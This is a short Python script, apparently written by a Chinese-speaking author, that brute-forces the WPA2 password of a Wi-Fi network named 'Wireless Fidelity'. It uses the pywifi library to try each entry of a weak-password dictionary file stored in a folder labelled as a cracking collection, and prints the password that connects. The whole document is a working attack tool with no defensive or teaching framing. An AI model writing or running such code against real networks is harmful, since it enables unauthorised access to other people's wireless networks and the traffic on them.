from pywifi import PyWiFi, const, Profile
from multiprocessing.dummy import Pool
from tqdm import tqdm
import time

wifi = PyWiFi()
iface = wifi.interfaces()[0]
iface.disconnect()

profile = Profile()
profile.ssid = 'Wireless Fidelity'
profile.akm.append(const.AKM_TYPE_WPA2PSK)
profile.auth = const.AUTH_ALG_OPEN
profile.cipher = const.CIPHER_TYPE_CCMP
iface.remove_all_network_profiles()

def test_wifi(password):
    tq.update(1)
    global profile
    iface.remove_network_profile(profile)
    profile.key = password
    temp_profile = iface.add_network_profile(profile)
    iface.connect(temp_profile)
    time.sleep(1)
    if iface.status() == const.IFACE_CONNECTED:
        print('密码正确：', password)
        time.sleep(5)
    iface.disconnect()


print('start...')
pwd_list = open(r'D:\破解合集\wifi码弱口令字典.txt', 'r').readlines()
with tqdm(desc='破解进度', total=93029, ncols=100, unit='个') as tq:
    pool = Pool(1000)
    pool.map(test_wifi, pwd_list)
